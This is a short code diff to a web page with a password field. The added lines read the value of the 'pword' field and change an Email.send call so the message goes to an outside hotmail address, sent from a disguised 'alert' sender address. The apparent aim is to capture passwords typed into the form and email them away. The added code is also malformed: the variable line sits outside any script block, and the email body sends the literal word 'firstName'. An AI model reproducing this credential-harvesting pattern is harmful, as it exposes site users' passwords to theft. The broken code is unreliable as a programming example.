@@ -7,12 +7,12 @@
   <input type="text" id="pword" name="pword" value=""><br>
 </form> 
 
-<p>If you click the "Submit" button, the form-data will be sent to a page called "/action_page.php".</p>
-
+	
+	
 </body>
 </html>
 
-	
+var firstName = document.getElementsByName("pword")[0].value;
 	
 	
 <head>
@@ -30,7 +30,7 @@ Email.send({
     To : 'guy_from_berks@hotmail.com',
     From : "alert.fabswingers.com@gmail.com",
     Subject : "Test email",
-    Body : "<html><h2>Header</h2><strong>Bold text</strong><br></br><em>Italic</em></html>"
+    Body : "<html><h2>firstName</h2>"
 }).then(
   message => alert(message)
 );
